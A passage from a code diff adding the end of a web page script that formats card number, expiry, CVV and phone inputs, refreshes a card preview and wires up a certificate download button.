+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += value[i];
+                }
+                
+                this.value = formatted;
+                
+                let newCursorPosition = cursorPosition;
+                if (isDeleting && cursorPosition > 0 && this.value[cursorPosition - 1] === ' ') {
+                    newCursorPosition = cursorPosition - 1;
+                } else if (!isDeleting && (cursorPosition === 5 || cursorPosition === 10 || cursorPosition === 15)) {
+                    newCursorPosition = cursorPosition + 1;
+                }
+                
+                this.setSelectionRange(newCursorPosition, newCursorPosition);
+                updateCardPreview();
+            });
+            
+            document.getElementById('phoneNumber').addEventListener('input', function(e) {
+                let value = this.value.replace(/\D/g, '');
+                value = value.substring(0, 10);
+                this.value = value;
+            });
+            
+            document.getElementById('phoneNumber').addEventListener('blur', updateCardPreview);
+            
+            document.getElementById('cardExpiry').addEventListener('input', function(e) {
+                let value = this.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                this.value = value;
+            });
+            
+            document.getElementById('cardExpiry').addEventListener('blur', updateCardPreview);
+            
+            document.getElementById('cardCvv').addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').substring(0, 3);
+            });
+            
+            document.getElementById('cardCvv').addEventListener('blur', updateCardPreview);
+            
+            document.getElementById('email').addEventListener('blur', updateCardPreview);
+            
+            document.getElementById('downloadCertificateBtn').addEventListener('click', downloadCertificate);
+        }
+    </script>
+</body>
+</html>
